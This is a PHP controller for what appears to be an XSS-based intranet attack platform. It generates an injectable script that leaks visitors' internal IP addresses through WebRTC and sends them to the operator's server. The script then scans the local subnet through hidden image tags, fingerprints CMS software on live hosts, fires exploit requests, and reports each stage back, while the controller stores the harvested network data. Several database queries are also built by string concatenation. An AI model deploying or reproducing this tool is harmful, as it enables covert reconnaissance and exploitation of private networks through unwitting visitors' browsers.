<?php
namespace Home\Controller;
use Think\Controller;
class RootApiController extends Controller {
    public function addProject(){
        if(I('post.name') == ""){
            $this->ajaxReturn(array(
                "typeMsg" => "error",
                "msgText" => "请输入项目名称",
            ));
        }
        $project['name'] = I('post.name');
        $project['note'] = I('post.note');
        if($project['note'] == ""){
            $project['note'] = "无备注";
        }
        $md5string = md5(date('Y-m-d H:i:s'));
        $project['onlystring'] = $md5string;
        $project['create_time'] = date('Y-m-d H:i:s');
        $projectData = M("project");
        $projectData->data($project)->add();
        $domain = I('server.HTTP_HOST');
        $file = './js/'.$md5string.'.js';
        $content = <<<WEBRTCJS
var onlyString = "$md5string";
var ipList               = [];
var survivalIpLIst       = [];
var deathIpLIst          = [];
var sendsurvivalIp       = "http://$domain/Api/survivalIp";
var snedIteratesIpUrl    = "http://$domain/Api/survivalPortIp";
var snedIteratesCmsIpUrl = "http://$domain/Api/survivalCmsIp"
var sendExistenceVul     = "http://$domain/Api/existenceVul";
var webrtcxss = {
    webrtc        : function(callback){
        var ip_dups           = {};
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        var mediaConstraints  = {
            optional: [{RtpDataChannels: true}]
        };
        var servers = undefined;
        if(window.webkitRTCPeerConnection){
            servers = {iceServers: []};
        }
        var pc = new RTCPeerConnection(servers, mediaConstraints);
        pc.onicecandidate = function(ice){
            if(ice.candidate){
                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; 
                if(ip_dups[ip_addr] === undefined)
                callback(ip_addr);
                ip_dups[ip_addr]    = true;
            }
        };
        pc.createDataChannel("");
        pc.createOffer(function(result){
            pc.setLocalDescription(result, function(){});
        });
    },
    getIp        : function(){
        this.webrtc(function(ip){
            ipList.push(ip);
        });
    }
}
webrtcxss.getIp();
function iteratesIp(){
    stage(1)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendsurvivalIp, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('survivalip='+ ipList.join("-") + '&onlystring=' + onlyString);
    for(var i = 0;i < ipList.length;i++){
        incompleteIp = ipList[i].split(".");
        incompleteIp.pop();
        incompleteIp = incompleteIp.join(".");
        for(var j = 1;j < 255;j++){
            var ip = incompleteIp + "." + j;
            var imgTag = document.createElement("img"); 
            imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
            imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
            imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
            imgTag.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(imgTag);
        }
    }
}
setTimeout("iteratesIp()",20000);
(function(){
    if(deathIpLIst.length + survivalIpLIst.length == 254){
        snedIteratesIpData(survivalIpLIst);
    }else{
        setTimeout(arguments.callee,5000);
    }
})();
function snedIteratesIpData(ip){
    if(deathIpLIst.length == 254){
        return false;
    }
    stage(2)
    ip = ip.join("-")
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var cmsPath = JSON.parse(ipAjax.responseText).path;
            for(var key in cmsPath){
                for(var i = 0;i < survivalIpLIst.length;i++){
                    var scriptTag = document.createElement("script"); 
                    scriptTag.setAttribute("src","http://" + survivalIpLIst[i] + cmsPath[key]);
                    scriptTag.setAttribute("data-ipadder",survivalIpLIst[i]);
                    scriptTag.setAttribute("data-cmsinfo",key);
                    scriptTag.setAttribute("data-onlyString",onlyString);
                    scriptTag.setAttribute("onload","javascript:vulnerabilityIpList(this)");
                    document.getElementsByTagName("body")[0].appendChild(scriptTag);
                }
            }
        }
    }
    ipAjax.open('POST', snedIteratesIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('iplist='+ip+'&onlystring='+onlyString);
}
function vulnerabilityIpList(info){
    stage(3)
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var vulCmsInfo = ipAjax.responseText;
            var img = document.createElement("img"); 
            img.setAttribute("scr",vulCmsInfo);
            img.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(img);
            setTimeout(function(){
                var scriptTag = document.createElement("script");
                scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");
                scriptTag.setAttribute("data-cmsinfo",info.getAttribute("data-cmsinfo"));
                scriptTag.setAttribute("data-vulip",info.getAttribute('data-ipadder'));
                scriptTag.setAttribute("onload","javascript:vulConfirm(this)");
                document.getElementsByTagName("body")[0].appendChild(scriptTag);
            },2000);
        }
    }
    ipAjax.open('POST', snedIteratesCmsIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('existenceCmsIp='+ info.getAttribute("data-ipadder") + '&existenceCmsInfo=' + info.getAttribute("data-cmsinfo") + '&onlystring=' + onlyString);
}
function vulConfirm(cmsConfirmInfo){
    stage(4)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendExistenceVul, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('cms='+ cmsConfirmInfo.getAttribute("data-cmsinfo") + '&vulip='+ cmsConfirmInfo.getAttribute("data-vulip") +'&onlystring=' + onlyString);
}
function stage(num){
    var updataStage = document.createElement("img");
    updataStage.setAttribute("src","http://$domain/Api/stage/onlystring/"+onlyString+"/updata/"+num);
    updataStage.setAttribute("style","display:none;");
    document.getElementsByTagName("body")[0].appendChild(updataStage);
}
WEBRTCJS;
        file_put_contents($file, $content);
        file_put_contents($file, $content,LOCK_EX);
        $this->ajaxReturn(array(
            "typeMsg" => "success",
            "msgText" => "<script src='http://$domain/js/$md5string.js'></script>",
        ));
    }
    public function delProjectId(){
        if(I('post.id','','int')  == ""){
            $this->ajaxReturn(array(
                "typeMsg" => "error",
            ));
        }
        $project = M("project");
        $ipdatalist = M("ipdatalist");
        $existencevul = M("existencevul");
        $existencecmsip = M('existencecmsip');
        $onlystring = $project->where('id="'.I('post.id','','int').'"')->find()['onlystring'];
        unlink("./js/$onlystring.js");
        $project->where('id="'.I('post.id','','int').'"')->delete();
        $ipdatalist->where('onlystring="'.$onlystring.'"')->delete();
        $existencevul->where('onlystring="'.$onlystring.'"')->delete();
        $existencecmsip->where('onlystring="'.$onlystring.'"')->delete();
        $this->ajaxReturn(array(
            "typeMsg" => "success",
            "msgText" => "删除成功",
        ));
    }
    public function findProject(){
        if(I('get.id','','int')  == ""){
            $this->ajaxReturn(array(
                "typeMsg" => "error",
            ));
        }
        $projectId = I('get.id','','int');
        $project = M("project");
        $projectInfo = $project->where('id="'.$projectId.'"')->find();
        $projectData['name'] = $projectInfo['name'];
        $projectData['note'] = $projectInfo['note'];
        $projectData['onlystring'] = $projectInfo['onlystring'];
        $projectData['stage'] = $projectInfo['stage'];
        $projectData['time'] = $projectInfo['create_time'];
        $projectData['jsfile'] = "http://".I('server.HTTP_HOST')."/js/".$projectData['onlystring'].".js";
        switch ($projectData['stage']) {
            case '0':
                $projectData['stagestring'] = "未被触发";
                break;
            case '1':
                $projectData['stagestring'] = "获取到内网IP信息";
                break;
            case '2':
                $projectData['stagestring'] = "检测到内网中开启了80端口的IP";
                break;
            case '3':
                $projectData['stagestring'] = "已确认内网存活主机的CMS信息";
                break;
            case '4':
                $projectData['stagestring'] = "已检测到内网主机中的漏洞真实存在";
                break;
            default:
                $projectData['stagestring'] = "未被触发";
                break;
        }
        switch ($projectData['stage']){
            case '0':
                $this->ajaxReturn(array(
                    "typeMsg" => "success",
                    "projectInfo" => $projectData,
                ));
                break;
            case '1':
                $survivalIpList                = M("survivaliplist");
                $survivalIpListData            = $survivalIpList->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['survivalip']     = $survivalIpListData['survival_ip'];
                $projectData['outsideip']      = $survivalIpListData['outside_ip'];
                break;
            case '2':
                $survivalIpList                = M("survivaliplist");
                $survivalIpListData            = $survivalIpList->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['survivalip']     = $survivalIpListData['survival_ip'];
                $projectData['outsideip']      = $survivalIpListData['outside_ip'];
                
                $ipdatalist                    = M("ipdatalist");
                $ipdatalistData                = $ipdatalist->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['survivalportip'] = $ipdatalistData['survival_ip'];
                break;
            case '3':
                $survivalIpList                = M("survivaliplist");
                $survivalIpListData            = $survivalIpList->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['survivalip']     = $survivalIpListData['survival_ip'];
                $projectData['outsideip']      = $survivalIpListData['outside_ip'];
                
                $ipdatalist                    = M("ipdatalist");
                $ipdatalistData                = $ipdatalist->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['survivalportip'] = $ipdatalistData['survival_ip'];

                $existencecmsip = M('existencecmsip');
                $existencecmsipDate = $existencecmsip->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['cms'] = $existencecmsipDate['cms'];
                $projectData['cmsip'] = $existencecmsipDate['inner_ip'];
                break;
            case '4':
                $survivalIpList                = M("survivaliplist");
                $survivalIpListData            = $survivalIpList->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['survivalip']     = $survivalIpListData['survival_ip'];
                $projectData['outsideip']      = $survivalIpListData['outside_ip'];
                
                $ipdatalist                    = M("ipdatalist");
                $ipdatalistData                = $ipdatalist->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['survivalportip'] = $ipdatalistData['survival_ip'];

                $existencecmsip = M('existencecmsip');
                $existencecmsipDate = $existencecmsip->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['cms'] = $existencecmsipDate['cms'];
                $projectData['cmsip'] = $existencecmsipDate['inner_ip'];

                $existencevul = M('existencevul');
                $existencevulData = $existencevul->where("onlystring='".$projectData['onlystring']."'")->find();
                $projectData['vulcms'] = $existencevulData['cms'];
                $projectData['vulip'] = $existencevulData['vulip'];
                break;
            default:
                $this->ajaxReturn(array(
                    "typeMsg" => "success",
                    "projectInfo" => $projectData,
                ));
                break;
        }
        $this->ajaxReturn(array(
            "typeMsg" => "success",
            "projectInfo" => $projectData,
        ));
    }
}